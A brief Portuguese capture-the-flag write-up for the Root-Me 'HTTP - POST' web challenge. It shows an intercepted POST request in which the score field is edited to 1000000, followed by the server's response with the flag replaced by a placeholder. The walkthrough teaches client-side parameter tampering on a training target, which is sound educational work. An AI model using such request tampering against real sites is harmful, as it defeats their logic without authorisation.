# HTTP - POST

Ao analisarmos a situação é perceptível que a pagina funciona como um game randomico que é vencido ao bater 1000000 de pontos. É possível capturar a requisição com Burp Suit por exemplo e fazer a alteração do parâmetro:
<pre>POST /web-serveur/ch56/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://challenge01.root-me.org/web-serveur/ch56/
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Connection: close
Upgrade-Insecure-Requests: 1
score=1000000&generate=Give+a+try%21</pre>

## Resposta:
<pre><p>Wow, 1000000! How did you do that? :o</p><p>Flag to validate the challenge: <strong>(flag_here)</strong></p></pre>
